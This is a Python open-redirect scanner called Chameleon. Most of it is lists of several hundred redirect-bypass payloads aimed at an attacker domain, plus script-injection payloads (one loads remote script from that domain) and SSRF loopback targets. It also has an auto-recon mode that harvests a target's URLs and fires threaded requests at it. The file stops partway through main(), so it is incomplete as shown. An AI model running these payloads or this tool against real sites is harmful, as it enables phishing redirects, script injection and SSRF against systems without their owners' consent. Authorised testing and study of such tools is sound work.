#!/usr/bin/env python3
"""
=========================================================
  CHAMELEON 🦎 - Open Redirect Vulnerability Scanner
=========================================================
A simple, fast, and effective tool to detect Open Redirect
vulnerabilities in a list of target URLs.

Author : harry_strapper
Usage  :
    python3 chameleon.py -l urls.txt -o results
    python3 chameleon.py -l urls.txt -o results -d attacker.com --threads 20

Input file (urls.txt) format - one URL per line, e.g.:
    https://example.com/login?redirect=https://example.com/home
    https://example.com/go?next=/dashboard
    https://example.com/out?url=https://example.com

If a URL has NO query parameter, Chameleon will also try
appending common open-redirect parameter names automatically.
=========================================================
"""

import argparse
import concurrent.futures
import csv
import re
import sys
import threading
import time
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, urljoin

# IMPORTANT: Python fully buffers stdout when it's not a terminal (e.g. when
# you redirect output to a file with `> log.txt`, or run it via nohup/cron).
# Without this, print() statements can sit in a buffer for a long time
# before actually appearing - making the tool LOOK like it's stuck/frozen
# even though it's actively working. Forcing line-buffering here means
# every print() shows up immediately, in a log file too.
try:
    sys.stdout.reconfigure(line_buffering=True)
except Exception:
    pass

print_lock = threading.Lock()

try:
    import requests
except ImportError:
    sys.exit("[!] 'requests' not installed. Run: pip install requests --break-system-packages")

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    COLOR = True
except ImportError:
    COLOR = False

    class _Dummy:
        def __getattr__(self, _):
            return ""
    Fore = Style = _Dummy()


# ---------------------------------------------------------
# Common open-redirect parameter names (used when a URL has
# no existing query string, or you want extra coverage)
# ---------------------------------------------------------
COMMON_PARAMS = [
    "redirect", "redirect_uri", "redirect_url", "url", "next", "target",
    "rurl", "dest", "destination", "continue", "return", "returnTo",
    "return_to", "checkout_url", "go", "out", "view", "to", "link",
    "u", "forward", "callback", "callback_url", "ReturnUrl", "image_url",
    "data", "path", "domain", "site", "window", "r", "nexturl", "redir",
]

# Substrings used in "smart mode" to decide if an EXISTING query
# param looks redirect-related (so we don't waste requests mutating
# every random param like ?id= or ?page= found in a huge recon dump)
REDIRECT_PARAM_KEYWORDS = [
    "redirect", "url", "uri", "next", "target", "rurl", "dest",
    "destination", "continue", "return", "checkout", "go", "out",
    "view", "to", "link", "forward", "callback", "nexturl", "redir",
    "navigate", "location", "window", "site", "domain", "path", "u",
    "ref", "image_url", "load", "file", "data", "page", "feed", "host",
]

# Payload templates - {DOMAIN} = attacker domain, {VICTIM} = original target host
# This list merges hand-picked classics with a large community-sourced
# open-redirect bypass set (deduped, parameterized). ~250+ variants.
PAYLOAD_TEMPLATES = [
    '//{DOMAIN}',
    '//{DOMAIN}/',
    '///{DOMAIN}',
    '///{DOMAIN}/',
    '////{DOMAIN}',
    '////{DOMAIN}/',
    'https://{DOMAIN}',
    'http://{DOMAIN}',
    'https:{DOMAIN}',
    'http:{DOMAIN}',
    '//{DOMAIN}%00',
    '//{DOMAIN}%0D%0A',
    '//{DOMAIN}%0A',
    '//{DOMAIN}%00/',
    'https://{DOMAIN}%00',
    'http://{DOMAIN}%00',
    '/\\/\\/{DOMAIN}',
    '/\\/{DOMAIN}',
    '/\\{DOMAIN}',
    '\\/\\/{DOMAIN}',
    '\\/{DOMAIN}',
    '\\{DOMAIN}',
    '%0D%0A//{DOMAIN}',
    '%0A//{DOMAIN}',
    '%00//{DOMAIN}',
    '@{DOMAIN}',
    '{DOMAIN}',
    '{DOMAIN}/',
    '//{DOMAIN}@{VICTIM}',
    'https://{DOMAIN}@{VICTIM}',
    'http://{DOMAIN}@{VICTIM}',
    '//{VICTIM}@{DOMAIN}',
    'https://{VICTIM}@{DOMAIN}',
    'http://{VICTIM}@{DOMAIN}',
    'javascript:alert(1)',
    "javascript:alert('XSS')",
    'javascript://{DOMAIN}',
    'javascript://{DOMAIN}%0Aalert(1)',
    "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://{DOMAIN}\\';document.body.appendChild(a)')",
    'data:text/html,<script>alert(1)</script>',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '//{DOMAIN}#@{VICTIM}',
    '//{VICTIM}#@{DOMAIN}',
    'https://{DOMAIN}#@{VICTIM}',
    'http://{DOMAIN}#@{VICTIM}',
    '//{DOMAIN}%23@{VICTIM}',
    '//{DOMAIN}%09',
    '//{DOMAIN}%2F..',
    '//{DOMAIN}%5C..',
    '//{DOMAIN}%252f..',
    '//{DOMAIN}%252F..',
    '//{DOMAIN}%252e%252e',
    '//{DOMAIN}%252E%252E',
    '/%09/{DOMAIN}',
    '/%2f/{DOMAIN}',
    '/%5c/{DOMAIN}',
    '//%09{DOMAIN}',
    '//%2f{DOMAIN}',
    '//%5c{DOMAIN}',
    '////%09{DOMAIN}',
    '////%2f{DOMAIN}',
    '////%5c{DOMAIN}',
    '//;@{DOMAIN}',
    '//@{DOMAIN}',
    '//{DOMAIN}%2f..',
    '//{DOMAIN}%2f..;',
    '//{DOMAIN}%2f%2e%2e',
    '//{DOMAIN}%2f%2e%2e;',
    '//{DOMAIN}//',
    '//{DOMAIN}//..',
    '//{DOMAIN}//..;',
    '//{DOMAIN}//.',
    '//{DOMAIN}//./',
    '//{DOMAIN}///..',
    '//{DOMAIN}///..;',
    '//{DOMAIN}////..',
    '//{DOMAIN}////..;',
    'http:/{DOMAIN}',
    '/https://{DOMAIN}',
    '/http://{DOMAIN}',
    '//https://{DOMAIN}',
    '//http://{DOMAIN}',
    '///https://{DOMAIN}',
    '///http://{DOMAIN}',
    '////https://{DOMAIN}',
    '////http://{DOMAIN}',
    'https:///{DOMAIN}',
    'http:///{DOMAIN}',
    'https:////{DOMAIN}',
    'http:////{DOMAIN}',
    '/https:{DOMAIN}',
    '/http:{DOMAIN}',
    '//https:{DOMAIN}',
    '//http:{DOMAIN}',
    '///https:{DOMAIN}',
    '///http:{DOMAIN}',
    '////https:{DOMAIN}',
    '////http:{DOMAIN}',
    '/\\/https://{DOMAIN}',
    '/\\/http://{DOMAIN}',
    '\\/https://{DOMAIN}',
    '\\/http://{DOMAIN}',
    '\\https://{DOMAIN}',
    '\\http://{DOMAIN}',
    '.{DOMAIN}',
    '..{DOMAIN}',
    '...{DOMAIN}',
    '///\\;@{DOMAIN}',
    '//{DOMAIN}/;/{VICTIM}',
    '//{DOMAIN};{VICTIM}',
    '//{DOMAIN};@{VICTIM}',
    'https://{DOMAIN};{VICTIM}',
    'http://{DOMAIN};{VICTIM}',
    'https://{DOMAIN};@{VICTIM}',
    'http://{DOMAIN};@{VICTIM}',
    '//{DOMAIN}\\.{VICTIM}',
    '//{DOMAIN}\\@{VICTIM}',
    'https://{DOMAIN}\\.{VICTIM}',
    'http://{DOMAIN}\\.{VICTIM}',
    'https://{DOMAIN}\\@{VICTIM}',
    'http://{DOMAIN}\\@{VICTIM}',
    '//{DOMAIN}%2F{VICTIM}',
    '//{DOMAIN}%5C{VICTIM}',
    '//{DOMAIN}%3F{VICTIM}',
    '//{DOMAIN}%23{VICTIM}',
    'https://{DOMAIN}%2F{VICTIM}',
    'http://{DOMAIN}%2F{VICTIM}',
    'https://{DOMAIN}%5C{VICTIM}',
    'http://{DOMAIN}%5C{VICTIM}',
    'https://{DOMAIN}%3F{VICTIM}',
    'http://{DOMAIN}%3F{VICTIM}',
    'https://{DOMAIN}%23{VICTIM}',
    'http://{DOMAIN}%23{VICTIM}',
    '/%2f%2f{DOMAIN}',
    '/%5c%5c{DOMAIN}',
    '/%2f%5c{DOMAIN}',
    '/%5c%2f{DOMAIN}',
    '//%252f{DOMAIN}',
    '//%255c{DOMAIN}',
    '/%252f%252f{DOMAIN}',
    '/%255c%255c{DOMAIN}',
    '//{DOMAIN}%20',
    '//{DOMAIN}%0D',
    'https://{DOMAIN}%20',
    'http://{DOMAIN}%20',
    'https://{DOMAIN}%09',
    'http://{DOMAIN}%09',
    'https://{DOMAIN}%0D',
    'http://{DOMAIN}%0D',
    'https://{DOMAIN}%0A',
    'http://{DOMAIN}%0A',
    '//{DOMAIN}:80',
    '//{DOMAIN}:443',
    '//{DOMAIN}:8080',
    '//{DOMAIN}:8443',
    'https://{DOMAIN}:80',
    'http://{DOMAIN}:443',
    'https://{DOMAIN}:8080',
    'http://{DOMAIN}:8080',
    'https://{DOMAIN}:8443',
    'http://{DOMAIN}:8443',
    '//{DOMAIN}:80/',
    '//{DOMAIN}:443/',
    'https://{DOMAIN}:80/',
    'http://{DOMAIN}:443/',
    '/{DOMAIN}',
    '/{DOMAIN}/',
    '/.{DOMAIN}',
    '/..{DOMAIN}',
    '//{VICTIM}.{DOMAIN}',
    'https://{VICTIM}.{DOMAIN}',
    'http://{VICTIM}.{DOMAIN}',
    '//{VICTIM}%2F@{DOMAIN}',
    '//{VICTIM}%5C@{DOMAIN}',
    'https://{VICTIM}%2F@{DOMAIN}',
    'http://{VICTIM}%2F@{DOMAIN}',
    'https://{VICTIM}%5C@{DOMAIN}',
    'http://{VICTIM}%5C@{DOMAIN}',
    '//{DOMAIN}#{VICTIM}',
    '//{DOMAIN}?{VICTIM}',
    'https://{DOMAIN}#{VICTIM}',
    'http://{DOMAIN}#{VICTIM}',
    'https://{DOMAIN}?{VICTIM}',
    'http://{DOMAIN}?{VICTIM}',
    '//evil%00.com',
    '//evil%20.com',
    '//evil%09.com',
    'https://evil%00.com',
    'http://evil%00.com',
    'https://evil%20.com',
    'http://evil%20.com',
    'https://evil%09.com',
    'http://evil%09.com',
    '//{DOMAIN}%E2%80%A8',
    '//{DOMAIN}%E2%80%A9',
    'https://{DOMAIN}%E2%80%A8',
    'http://{DOMAIN}%E2%80%A8',
    'https://{DOMAIN}%E2%80%A9',
    'http://{DOMAIN}%E2%80%A9',
    '//{DOMAIN}%2f%2e{VICTIM}',
    '//{DOMAIN}%2f..%2f{VICTIM}',
    '//{DOMAIN}%2f%2e%2e%2f{VICTIM}',
    'https://{DOMAIN}%2f%2e{VICTIM}',
    'http://{DOMAIN}%2f%2e{VICTIM}',
    '//{VICTIM}/%2f%2f{DOMAIN}',
    '//{VICTIM}/%5c%5c{DOMAIN}',
    'https://{VICTIM}/%2f%2f{DOMAIN}',
    'http://{VICTIM}/%2f%2f{DOMAIN}',
    'https://{VICTIM}/%5c%5c{DOMAIN}',
    'http://{VICTIM}/%5c%5c{DOMAIN}',
    '//victim%00.com@{DOMAIN}',
    '//victim%20.com@{DOMAIN}',
    'https://victim%00.com@{DOMAIN}',
    'http://victim%00.com@{DOMAIN}',
    'https://victim%20.com@{DOMAIN}',
    'http://victim%20.com@{DOMAIN}',
    '//{DOMAIN}&{VICTIM}',
    '//{DOMAIN}|{VICTIM}',
    'https://{DOMAIN}&{VICTIM}',
    'http://{DOMAIN}&{VICTIM}',
    'https://{DOMAIN}|{VICTIM}',
    'http://{DOMAIN}|{VICTIM}',
    '//{DOMAIN}/{VICTIM}/../{DOMAIN}',
    '//{DOMAIN}/{VICTIM}/../../{DOMAIN}',
    'https://{DOMAIN}/{VICTIM}/../{DOMAIN}',
    'http://{DOMAIN}/{VICTIM}/../{DOMAIN}',
    '//:%252F@{DOMAIN}',
    '//:%5C@{DOMAIN}',
    'https://:%252F@{DOMAIN}',
    'http://:%252F@{DOMAIN}',
    'https://:%5C@{DOMAIN}',
    'http://:%5C@{DOMAIN}',
    '//{DOMAIN}/%2F..',
    '//{DOMAIN}/%5C..',
    '//{DOMAIN}/%2F%2E%2E',
    '//{DOMAIN}/%5C%2E%2E',
    'https://{DOMAIN}/%2F..',
    'http://{DOMAIN}/%2F..',
    'https://{DOMAIN}/%5C..',
    'http://{DOMAIN}/%5C..',
    '//www.{DOMAIN}',
    '//www.{DOMAIN}/',
    'https://www.{DOMAIN}',
    'http://www.{DOMAIN}',
    '//subdomain.{DOMAIN}',
    '//subdomain.{DOMAIN}/',
    'https://subdomain.{DOMAIN}',
    'http://subdomain.{DOMAIN}',
    '//{DOMAIN}////',
    '//{DOMAIN}/////',
    'https://{DOMAIN}////',
    'http://{DOMAIN}////',
    'https://{DOMAIN}/////',
    'http://{DOMAIN}/////',
]

# HTML / script injection payloads - for params that get reflected
# UNESCAPED into the page HTML (not just used in a Location header).
# If the param value lands raw in the DOM, these break out of the
# surrounding attribute/tag and force a client-side redirect via a
# <script> tag, an onerror handler, or a <meta> refresh tag.
HTML_INJECTION_PAYLOADS = [
    "<script>window.location='https://{DOMAIN}'</script>",
    "<script>document.location='https://{DOMAIN}'</script>",
    '"><script>window.location=\'https://{DOMAIN}\'</script>',
    "'><script>window.location='https://{DOMAIN}'</script>",
    '"><img src=x onerror="window.location=\'https://{DOMAIN}\'">',
    '\'><img src=x onerror=\'window.location="https://{DOMAIN}"\'>',
    '<img src=x onerror="window.location=\'https://{DOMAIN}\'">',
    '<meta http-equiv="refresh" content="0;url=https://{DOMAIN}">',
    '"><meta http-equiv="refresh" content="0;url=https://{DOMAIN}">',
    '<svg onload="window.location=\'https://{DOMAIN}\'">',
    '"><svg onload="window.location=\'https://{DOMAIN}\'">',
    '<body onload="window.location=\'https://{DOMAIN}\'">',
    '<iframe src="https://{DOMAIN}"></iframe>',
    '<a href="https://{DOMAIN}" id="x"></a><script>document.getElementById(\'x\').click()</script>',
]

# Internal-network / SSRF-style targets - not about the attacker domain at
# all, these check whether the redirect sink blindly trusts internal/
# loopback hosts (useful signal for chained SSRF via open redirect).
INTERNAL_PAYLOADS = [
    '//127.0.0.1',
    'https://127.0.0.1',
    'http://127.0.0.1',
    '//localhost',
    'https://localhost',
    'http://localhost',
    '//[::1]',
    'https://[::1]',
    'http://[::1]',
    '//[0:0:0:0:0:0:0:1]',
    '//0x7f.0x0.0x0.0x1',
    'https://0x7f.0x0.0x0.0x1',
    'http://0x7f.0x0.0x0.0x1',
]

# Unicode / homoglyph dot tricks - these specifically target buggy
# URL-parsing normalization (e.g. treating U+3002 as '.'). They stay
# fixed strings since they test a parser bug rather than attacker-
# domain reflection; harmless to send during an authorized scan.
UNICODE_BYPASS_PAYLOADS = [
    '//evil%E3%80%82com',
    '//evil%00.com',
    '//evil%u3002com',
    '//evil%u30FBcom',
    'https://evil。com',
    'http://evil。com',
    'https://evil%E3%80%82com',
    'http://evil%E3%80%82com',
]


# Ordered checks for "this path segment is a VALUE that varies per
# record, not a meaningful static route word". Order matters - more
# specific patterns are checked before the generic catch-all.
_NUMERIC_SEGMENT = re.compile(r"^\d+$")
_UUID_SEGMENT = re.compile(
    r"^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$", re.IGNORECASE
)
_HEX_SEGMENT = re.compile(r"^[0-9a-f]{6,}$", re.IGNORECASE)          # md5/sha1/sha256, git hashes, short hex ids
_DATE_SEGMENT = re.compile(r"^\d{4}[-_]\d{2}[-_]\d{2}$|^\d{2}[-_]\d{2}[-_]\d{4}$")  # 2024-01-15, 15-01-2024
_EMAIL_SEGMENT = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
_BASE64_SEGMENT = re.compile(r"^[A-Za-z0-9+/_\-]{16,}={0,2}$")        # base64 / base64url tokens, session ids
# Generic "slug with a changing number/token in it" - e.g. product-1023,
# user_8f3k2a, post-2024-55 - has letters AND digits mixed, reasonably
# long, made only of url-safe identifier characters.
_MIXED_TOKEN_SEGMENT = re.compile(r"^[A-Za-z0-9_\-\.]{6,}$")


def _is_variable_segment(seg):
    if _NUMERIC_SEGMENT.match(seg):
        return "{num}"
    if _UUID_SEGMENT.match(seg):
        return "{uuid}"
    if _HEX_SEGMENT.match(seg):
        return "{hash}"
    if _EMAIL_SEGMENT.match(seg):
        return "{email}"
    if _DATE_SEGMENT.match(seg):
        return "{date}"
    if _BASE64_SEGMENT.match(seg):
        return "{token}"
    if _MIXED_TOKEN_SEGMENT.match(seg) and any(c.isdigit() for c in seg) and any(c.isalpha() for c in seg):
        return "{token}"
    return None


def _normalize_path(path):
    """
    Replaces path segments that look like a per-record VALUE (numeric
    id, UUID, hash, date, email, session token, or a slug with a
    digit baked in like "product-1023") with a placeholder - not just
    plain numeric ids. This collapses things like:
        /product/101/view            vs /product/102/view
        /user/8f3e9c7b2a1d/profile   vs /user/55a2b9c1f004/profile
        /post/2024-01-15/summary     vs /post/2024-03-02/summary
        /invite/dGVzdEBleGFtcGxl     vs /invite/YW5vdGhlckB4eXo=
        /u/john.doe@example.com      vs /u/jane@example.com
        /blog/my-post-1023           vs /blog/my-post-2044
    all down to the same pattern, so only ONE representative gets
    tested instead of every variant. Plain words (e.g. "profile",
    "checkout", "about-us") are left untouched since they don't match
    any of the variable-looking patterns above.
    """
    segments = path.rstrip("/").split("/")
    normalized = [_is_variable_segment(seg) or seg for seg in segments]
    return "/".join(normalized)


def url_pattern_key(url):
    """
    Builds a signature for a URL that ignores VALUES that typically just
    identify a specific record - query param values AND numeric/UUID
    path segments - and only looks at: host + normalized path + sorted
    param NAMES.

    This is what lets us treat all of:
        /product?id=101
        /product?id=102
        /product/101/view
        /product/102/view
    as the SAME pattern - so we only test one representative instead of
    every single id. A different param NAME set or a genuinely different
    path still counts as a different pattern, e.g. /product?id=101 vs
    /product?id=101&ref=fb are NOT the same pattern, and /product?id=101
    vs /checkout?id=101 are NOT the same pattern either.
    """
    parsed = urlparse(url)
    param_names = tuple(sorted(k for k, _ in parse_qsl(parsed.query, keep_blank_values=True)))
    normalized_path = _normalize_path(parsed.path)
    return (parsed.netloc.lower(), normalized_path, param_names)


def dedupe_urls_by_pattern(urls):
    """
    Collapses URLs that only differ by parameter VALUES (like id=101,
    id=102, id=103 ...) down to one representative URL per unique
    pattern. Keeps the FIRST URL seen for each pattern. Order of input
    is preserved for the kept URLs.
    """
    seen_patterns = set()
    deduped = []
    for url in urls:
        key = url_pattern_key(url)
        if key not in seen_patterns:
            seen_patterns.add(key)
            deduped.append(url)
    return deduped


def normalize_domain(domain):
    """Make sure domain has a scheme, so urlparse/requests work properly."""
    if not domain.startswith("http://") and not domain.startswith("https://"):
        domain = "https://" + domain
    return domain.rstrip("/")


def fetch_wayback_urls(domain, limit=20000, timeout=20):
    """
    Pull historical URLs for a domain from the Wayback Machine's
    public CDX API. This is the same technique tools like
    waybackurls/gau use - completely passive, no requests sent to
    the target itself.
    """
    bare_domain = urlparse(domain).netloc or domain
    print(f"[*] Querying Wayback Machine for {bare_domain} ...")
    try:
        resp = requests.get(
            "http://web.archive.org/cdx/search/cdx",
            params={
                "url": f"{bare_domain}/*",
                "output": "json",
                "collapse": "urlkey",
                "fl": "original",
                "limit": str(limit),
            },
            timeout=timeout,
        )
        data = resp.json()
        if not data or len(data) < 2:
            print("[*] Wayback Machine returned no historical URLs.")
            return []
        urls = [row[0] for row in data[1:]]
        print(f"[+] Wayback Machine returned {len(urls)} URL(s)")
        return urls
    except Exception as e:
        print(f"[!] Wayback Machine lookup failed ({e}) - continuing without it")
        return []


def crawl_site(base_url, max_pages=40, timeout=8):
    """
    Very lightweight same-domain crawler. Starts at the homepage,
    follows internal links (BFS), and collects every URL seen -
    including ones with query strings, which is what we actually
    care about for redirect testing.
    """
    print(f"[*] Crawling {base_url} (max {max_pages} pages) ...")
    visited = set()
    found_urls = set()
    queue = [base_url]
    base_host = urlparse(base_url).netloc

    while queue and len(visited) < max_pages:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)
        try:
            resp = requests.get(
                url, timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0 (Chameleon-Recon)"}
            )
        except requests.RequestException as e:
            print(f"    [crawl {len(visited)}/{max_pages}] FAILED: {url} ({e.__class__.__name__})")
            continue

        print(f"    [crawl {len(visited)}/{max_pages}] OK [{resp.status_code}]: {url}")
        found_urls.add(url)

        for match in re.findall(r'(?:href|src|action)=["\']([^"\'#\s]+)', resp.text, re.IGNORECASE):
            abs_url = urljoin(url, match)
            parsed = urlparse(abs_url)
            if parsed.netloc == base_host and parsed.scheme in ("http", "https"):
                found_urls.add(abs_url)
                if abs_url not in visited and len(visited) + len(queue) < max_pages * 3:
                    queue.append(abs_url)

    print(f"[+] Crawl discovered {len(found_urls)} URL(s)")
    return list(found_urls)


def auto_recon(domain, max_urls=300, crawl_pages=40):
    """
    Full auto-recon pipeline used when the user gives just a domain
    instead of a URL list: Wayback history + live crawl, merged,
    deduped, and prioritized so URLs with redirect-looking params
    come first.
    """
    domain = normalize_domain(domain)
    wayback = fetch_wayback_urls(domain)
    crawled = crawl_site(domain, max_pages=crawl_pages)

    all_urls = list(dict.fromkeys(wayback + crawled))  # dedupe, keep order

    def has_redirect_param(u):
        q = parse_qsl(urlparse(u).query)
        return any(any(kw in k.lower() for kw in REDIRECT_PARAM_KEYWORDS) for k, _ in q)

    def has_any_param(u):
        return bool(urlparse(u).query)

    priority = [u for u in all_urls if has_redirect_param(u)]
    secondary = [u for u in all_urls if has_any_param(u) and u not in priority]
    rest = [u for u in all_urls if u not in priority and u not in secondary]

    ordered = priority + secondary + rest
    final = ordered[:max_urls]

    print(f"[+] Total unique URLs after recon: {len(all_urls)}")
    print(f"[+] Using top {len(final)} URL(s) for scanning "
          f"({len(priority)} with redirect-like params, {len(secondary)} with other params, "
          f"{len(final) - len(priority) - len(secondary)} with none)\n")
    return final


def banner():
    print(Fore.CYAN + Style.BRIGHT + r"""
   _____ _                      _                     
  / ____| |                    | |                    
 | |    | |__   __ _ _ __ ___  | | ___  ___  _ __      ____
 | |    | '_ \ / _` | '_ ` _ \ | |/ _ \/ _ \| '_ \    /_   |
 | |____| | | | (_| | | | | | ||  __/ (_) | | | |     | |
  \_____|_| |_|\__,_|_| |_| |_|\___|\___/|_| |_|     |_|
""" + Style.RESET_ALL + "      Open Redirect Vulnerability Scanner 🦎\n"
          "      Made by harry_strapper\n")


def build_payload_urls(url, attacker_domain, all_params=False, extended=False):
    """
    Given a URL, yield (test_url, param_name, payload) tuples.

    Smart mode (default, all_params=False):
        Only mutates EXISTING params whose name looks redirect-related
        (see REDIRECT_PARAM_KEYWORDS). Good for huge recon URL lists
        where most params (id, page, token, etc.) are irrelevant.
        If no param looks redirect-related, falls back to appending
        COMMON_PARAMS as new query params.

    Aggressive mode (all_params=True):
        Mutates every existing param, regardless of its name.
    """
    parsed = urlparse(url)
    victim_host = parsed.netloc.split(":")[0]  # host without port, used in bypass tricks
    existing_params = parse_qsl(parsed.query, keep_blank_values=True)

    template_set = list(PAYLOAD_TEMPLATES)
    if extended:
        template_set += HTML_INJECTION_PAYLOADS + INTERNAL_PAYLOADS + UNICODE_BYPASS_PAYLOADS

    payloads = [
        t.format(DOMAIN=attacker_domain, VICTIM=victim_host) for t in template_set
    ]

    if existing_params:
        if all_params:
            param_names = [p[0] for p in existing_params]
        else:
            param_names = [
                p[0] for p in existing_params
                if any(kw in p[0].lower() for kw in REDIRECT_PARAM_KEYWORDS)
            ]
        if not param_names:
            # nothing looked redirect-related -> skip mutating junk params,
            # just append common ones instead
            param_names = []
            for pname in COMMON_PARAMS:
                new_params = existing_params + [(pname, "")]
                for payload in payloads:
                    final_params = existing_params + [(pname, payload)]
                    new_query = urlencode(final_params)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    yield test_url, pname, payload
            return
    else:
        param_names = COMMON_PARAMS

    for pname in param_names:
        for payload in payloads:
            if existing_params:
                new_params = [(k, payload if k == pname else v) for k, v in existing_params]
            else:
                new_params = [(pname, payload)]
            new_query = urlencode(new_params)
            test_url = urlunparse(parsed._replace(query=new_query))
            yield test_url, pname, payload


def is_vulnerable(location_value, attacker_domain):
    """
    STRICT check: parses the redirect target as a URL and compares its
    actual HOST to the attacker domain - exact match or a real
    subdomain of it. This avoids false positives from substring
    matching, e.g. a Location of 'https://myevil.com.hack.net/x'
    contains the substring 'evil.com' but does NOT actually redirect
    to our attacker domain - the old substring check would have
    wrongly flagged this as vulnerable.
    """
    if not location_value:
        return False

    attacker = attacker_domain.lower().strip().rstrip("/")

    try:
        parsed = urlparse(location_value.strip())
    except Exception:
        return False

    netloc = parsed.netloc
    if not netloc:
        # No netloc at all -> it's a relative path (e.g. "/dashboard"),
        # not a redirect to an external attacker-controlled host.
        return False

    # Strip any userinfo (user:pass@host) and port, keep just the host
    host = netloc.split("@")[-1].split(":")[0].lower()

    if not host:
        return False

    return host == attacker or host.endswith("." + attacker)


BODY_REDIRECT_PATTERNS = [
    # <meta http-equiv="refresh" content="0;url=https://evil.com">
    r'<meta[^>]+http-equiv=["\']refresh["\'][^>]*content=["\'][^"\']*url\s*=\s*([^"\'>\s]+)',
    # window.location = "..."  /  location.href = "..."
    r'(?:window\.)?location(?:\.href)?\s*=\s*["\']([^"\']+)["\']',
    # location.replace("...")
    r'location\.replace\(\s*["\']([^"\']+)["\']\s*\)',
    # location.assign("...")
    r'location\.assign\(\s*["\']([^"\']+)["\']\s*\)',
]


def find_body_redirect(html, attacker_domain):
    """
    Looks for ACTUAL redirect statements (meta refresh / JS location
    assignment) in the response body, and only returns a match if the
    target host genuinely resolves to the attacker domain (via the
    same strict is_vulnerable() host check). This replaces a naive
    'is the domain string anywhere in the page' check, which produced
    false positives on pages that merely mention/reflect the domain
    without actually redirecting to it.
    """
    for pattern in BODY_REDIRECT_PATTERNS:
        for match in re.findall(pattern, html, re.IGNORECASE):
            if is_vulnerable(match, attacker_domain):
                return match
    return None


def check_url(test_url, param, payload, attacker_domain, timeout, verbose=False):
    if verbose:
        with print_lock:
            print(f"    [>] sending: param={param} -> {test_url}")
    try:
        resp = requests.get(
            test_url,
            allow_redirects=False,
            timeout=timeout,
            headers={"User-Agent": "Mozilla/5.0 (Chameleon-Scanner)"}
        )
        location = resp.headers.get("Location", "")

        # Case 1: direct redirect via Location header
        if resp.status_code in (301, 302, 303, 307, 308) and is_vulnerable(location, attacker_domain):
            return {
                "url": test_url, "param": param, "payload": payload,
                "status": resp.status_code, "location": location, "vulnerable": True
            }

        # Case 2: some apps redirect via JS/meta refresh instead of a
        # Location header. We only flag this if an actual redirect
        # statement is found AND its target host genuinely matches
        # the attacker domain (strict check, no loose substring match).
        if resp.status_code == 200:
            body_match = find_body_redirect(resp.text[:5000], attacker_domain)
            if body_match:
                return {
                    "url": test_url, "param": param, "payload": payload,
                    "status": resp.status_code,
                    "location": f"(body redirect found: {body_match})",
                    "vulnerable": True
                }

        return {
            "url": test_url, "param": param, "payload": payload,
            "status": resp.status_code, "location": location, "vulnerable": False
        }
    except requests.RequestException as e:
        return {
            "url": test_url, "param": param, "payload": payload,
            "status": "ERROR", "location": str(e), "vulnerable": False
        }


def main():
    parser = argparse.ArgumentParser(description="Chameleon - Open Redirect Vulnerability Scanner")
    parser.add_argument("-l", "--list", help="File containing list of target URLs (one per line)")
    parser.add_argument("-u", "--target", help="Just a domain/site (e.g. example.com) - Chameleon will "
                                                "auto-recon (Wayback Machine + live crawl) and find URLs itself. "
                                                "Use this INSTEAD of -l when you don't have a URL list.")
    parser.add_argument("-o", "--output", default="chameleon_results", help="Output file name prefix (default: chameleon_results)")
    parser.add_argument("-d", "--domain", default="evil.com", help="Attacker domain to test with (default: evil.com)")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of concurrent threads (default: 10)")
    parser.add_argument("--timeout", type=int, default=8, help="Request timeout in seconds (default: 8)")
    parser.add_argument("--all-params", action="store_true",
                         help="Mutate EVERY query param found, not just redirect-sounding ones "
                              "(slower, use for smaller/targeted lists, not huge recon dumps)")
    parser.add_argument("--extended", action="store_true",
                         help="Also send HTML/script-injection payloads (for reflected, unescaped "
                              "params), internal-IP/SSRF-style payloads, and unicode homoglyph "
                              "tricks on top of the main ~250 payload set (much slower, more requests)")
    parser.add_argument("--max-urls", type=int, default=300,
                         help="[auto-recon mode] max URLs to keep after recon, before scanning (default: 300)")
    parser.add_argument("--crawl-pages", type=int, default=40,
                         help="[auto-recon mode] max pages to crawl live on the target (default: 40)")
    parser.add_argument("--no-dedupe", action="store_true",
                         help="Disable pattern dedup - by default, URLs that only differ by a "
                              "value like id=101/id=102/id=103 (same host+path+param names) are "
                              "collapsed to ONE test. Use this to test every URL individually.")
    parser.add_argument("-v", "--verbose", action="store_true",
                         help="Show EVERY request as it's being sent (not just the result once it "
                              "comes back), plus a live progress counter. Use this if the tool "
                              "looks like it's stuck - it shows you exactly what's happening in "
                              "real time instead of waiting for requests to complete.")
    parser.add_argument("--progress-every", type=int, default=25,
                         help="Print a progress summary line every N completed requests (default: 25). "
                              "Lower this (e.g. 5) for more frequent updates on slow targets.")
    args = parser.parse_args()

    banner()

    if not args.list and not args.target:
        sys.exit("[!] Provide either -l urls.txt  OR  -u domain.com")

    if args.list:
        try:
            with open(args.list, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            sys.exit(f"[!] File not found: {args.list}")
        if not urls:
            sys.exit("[!] URL list is empty.")
    else:
        urls = auto_recon(args.target, max_urls=args.max_urls, crawl_pages=args.crawl_pages)
        if not urls:
            sys.exit("[!] Auto-recon found no URLs. Try a different domain, or supply -l with a manual list.")
        # save discovered URLs for reference / reuse with other tools
        discovered_path = f"{args.output}_discovered_urls.txt"
        with open(discovered_path, "w") as f:
            f.write("\n".join(urls))
        print(f"[+] Discovered URLs saved to: {discovered_path}\n")

    # Dedup URLs that only differ by a changing value like id=101, id=102,
    # id=103 ... (same host + path + param NAMES = same pattern, so we
    # only need to test it once). Saves a huge number of redundant
    # requests on big recon dumps. Disable with --no-dedupe if you want
    # every single URL tested individually regardless of pattern.
    if not args.no_dedupe:
        before = len(urls)
        urls = dedupe_urls_by_pattern(urls)
        removed = before - len(urls)
        if removed > 0:
            print(f"[*] Pattern dedup: {before} URL(s) -> {len(urls)} unique pattern(s) "
                  f"({removed} skipped as duplicates, e.g. only id=101/102/103 style values differ)\n")

    print(f"[*] Loaded {len(urls)} URL(s)")
    print(f"[*] Attacker domain: {args.domain}")
